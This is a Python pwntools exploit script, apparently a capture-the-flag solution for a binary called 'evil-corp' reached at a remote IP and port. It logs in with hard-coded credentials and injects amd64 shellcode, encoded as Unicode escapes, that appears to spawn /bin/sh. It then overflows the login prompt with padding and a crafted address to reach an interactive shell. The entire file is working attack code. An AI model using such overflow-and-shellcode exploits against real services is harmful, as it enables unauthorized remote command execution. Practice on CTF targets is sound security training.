#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./evil-corp')
context.arch = 'amd64'
#p = process()
p = remote('83.136.251.254',51821)

def login():
    p.recvuntil(b'Username: ')
    p.sendline(b'eliot')
    p.recvuntil(b'Password: ')
    p.sendline(b'4007')

def logout():
    p.recvuntil(b'>> ')
    p.sendline(b'3')

def login1(data):
    p.recvuntil(b'Username: ')
    p.sendline(b'eliot')
    p.recvuntil(b'Password: ')
    p.sendline(data)
def input_1(data):
    p.recvuntil(b'>> ')
    p.sendline(b'2')
    sleep(0.1)
    p.sendline(data)
login()

shellcode = '\u686a\ub848\u622f\u6e69\u2f2f\u732f\u4850\ue789\u7268\u0169\u8101\u2434\u0101\u0101\uf631\u6a56\u5e08\u0148\u56e6\u8948\u31e6\u6ad2\u583b\u050f'
input_1('a'*0x800 + shellcode)
logout()

login1('a'*0x56+'U00011000' + '\x00\x00')




p.interactive()
